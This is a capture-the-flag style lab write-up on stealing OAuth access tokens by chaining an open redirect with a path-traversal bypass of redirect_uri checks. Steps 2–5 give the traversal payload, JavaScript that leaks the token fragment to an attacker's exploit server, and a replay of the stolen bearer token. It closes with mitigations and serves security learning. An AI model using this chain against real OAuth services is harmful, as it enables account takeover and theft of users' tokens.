# Stealing OAuth Access Tokens via an Open Redirect

## Vulnerability Overview



This lab combines an **Open Redirect** with a weakness in OAuth `redirect_uri` validation to steal a victim's access token.


The OAuth server rejects a direct redirect to an external domain. However, the allowed callback path can be manipulated with directory 
traversal to reach an internal endpoint that performs an open redirect.



The victim is then redirected to the attacker's Exploit Server, allowing the attacker to capture the OAuth token.



## Steps to Solve

### 1. Understand the OAuth Flow

- Logged in using `wiener:peter`.

- Observed that the OAuth request used `response_type=token`.

- After authorization, the access token was returned in the URL fragment:



```http

#access_token=TOKEN&token_type=Bearer

```



### 2. Identify the Open Redirect

Directly changing `redirect_uri` to an external domain was rejected.



I tested the blog's next-post endpoint:



```http

GET /post/next?path=https://example.com


```



The response redirected to the supplied destination:



```http

HTTP/2 302 Found

Location: https://example.com

```



This confirmed an open redirect through the `path` parameter.



### 3. Bypass Redirect URI Validation

Used directory traversal to reach the redirect endpoint through the allowed callback path:



```text

/oauth-callback/../post/next?path=https://EXPLOIT-SERVER/exploit/

```



This allowed the OAuth redirect to reach an internal endpoint that redirected the victim to the external Exploit Server.


### 4. Steal the Access Token

Configured JavaScript on the Exploit Server to:

- Start the OAuth flow when the page has no URL fragment.

- Read the fragment after the victim returns with the access token.

- Redirect to a URL containing the fragment contents, exposing the token in the Exploit Server access logs.



Core payload logic:


```javascript

if (!document.location.hash) {

    // Start the OAuth flow

} else {

    window.location = '/?' + document.location.hash.substr(1);

}

```



Stored the exploit and selected **Deliver exploit to victim**. Then checked the access logs to retrieve the stolen token.



### 5. Use the Stolen Token

Sent a request to the OAuth server using Burp Repeater:



```http

GET /me HTTP/2

Host: OAUTH-SERVER

Authorization: Bearer STOLEN-ACCESS-TOKEN

```




The response identified the user as `administrator` and returned the administrator's account information and API key. Used the required API 
key to solve the lab.



## Why It Worked

- The `redirect_uri` validation could be bypassed through path manipulation.

- The internal endpoint accepted an attacker-controlled redirect destination.

- The access token was returned in the URL fragment.

- The exploit moved the fragment contents into a URL recorded by the Exploit Server's access logs.



## Key Takeaway



**Open Redirect + Directory Traversal + OAuth token exposure = Access Token Theft**



## Mitigations

- Validate redirect URIs against exact, pre-registered values.

- Remove or securely validate open redirect functionality.

- Avoid exposing access tokens through URLs and logs.

- Use an OAuth flow appropriate for the application and follow current OAuth security best practices.
